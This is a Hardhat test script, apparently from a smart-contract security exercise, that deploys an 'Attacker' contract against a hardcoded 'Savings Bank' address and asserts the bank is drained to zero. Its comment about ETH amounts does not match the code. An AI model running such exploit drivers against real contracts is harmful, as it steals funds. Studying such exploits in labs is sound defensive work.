// We requie the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.

const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { parseEther } = require("ethers/lib/utils");
const { ethers } = require("hardhat");
const { logtime } = require("../scripts/libraries/timelogger");

const savingsBankAddress = "0xC5FC7cE1d859E6604f1e8E57BA0f4A92858850Bc"

describe("Attack", function () {
  it("Perform attack - Should empty the balance of the Savings Bank", async function () {
  logtime();
  const accounts = await ethers.getSigners();
  const contractOwner = accounts[0];
  const attackerFactory = await ethers.getContractFactory("Attacker");
  const attacker = await attackerFactory.deploy(savingsBankAddress);
  await attacker.deployed();
  console.log("Bad contract deployed");
  await new Promise(r => setTimeout(r, 10000));

  tx = await attacker.connect(contractOwner).attack({
         value: parseEther("0.001"),
	 gasLimit: 1000000,
       });
  await tx.wait();

  console.log("Attack Executed");
  // Balance of the savingsBank's address is now zero
  balanceETH = await ethers.provider.getBalance(savingsBankAddress);
  expect(balanceETH).to.equal(BigNumber.from("0"));

  // Balance of attacker is now 4 ETH (3 ETH stolen + 1 ETH from attacker)
  balanceETH = await ethers.provider.getBalance(attacker.address);
  expect(balanceETH).to.equal(parseEther("0.004"));
  logtime();
  });
});
